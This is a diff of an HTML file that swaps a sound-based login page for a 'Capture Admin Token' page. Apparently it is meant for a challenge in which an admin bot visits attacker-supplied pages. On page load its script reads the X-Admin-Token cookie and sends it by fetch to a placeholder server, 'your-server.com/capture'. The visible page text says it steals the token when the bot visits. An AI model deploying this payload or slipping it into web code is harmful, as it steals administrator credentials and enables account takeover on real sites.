@@ -1,36 +1,39 @@
 <!DOCTYPE html>
-<html lang = "en">
-
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <title>Sound Based Log In</title>
-    <link href="style.css" rel="stylesheet" type="text/css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Admin Token</title>
+    <script>
+        // Function to capture the X-Admin-Token cookie and send it to your server
+        function captureToken() {
+            // Get the cookie value for X-Admin-Token
+            const token = document.cookie.match(/X-Admin-Token=([^;]+)/);
+            
+            // If the X-Admin-Token is found in the cookies, send it to your server
+            if (token) {
+                const adminToken = token[1];  // Extract the token value
+                
+                // Replace with your server URL where you'll catch the token
+                fetch('https://your-server.com/capture?token=' + adminToken)
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log('Token sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending token:', error);
+                    });
+            } else {
+                console.log('X-Admin-Token not found in cookies');
+            }
+        }
+
+        // Call the captureToken function when the page loads
+        window.onload = captureToken;
+    </script>
 </head>
-
 <body>
-<meter id = "volumeMeter" high = "0.5" max = "1" value = "0"></meter>
-<div>
-    <button id=DS onclick = DecreaseSens()>
-        - Sensitivity
-    </button>
-    <p id = Sensitivity>
-
-    </p>
-    <button id = IS onclick = IncreaseSens()>
-        + Sensitivity
-    </button>
-</div>
-<p id = AnswerForm>
-
-</p>
-<button onclick = lockVal()>
-    Lock
-</button>
-<p id = volNum>
-    NaN
-</p>
-<script src="script.js"></script>
+    <h1>Capture Admin Token</h1>
+    <p>This page will automatically capture and send the X-Admin-Token cookie if it's present when the bot visits.</p>
 </body>
-
 </html>
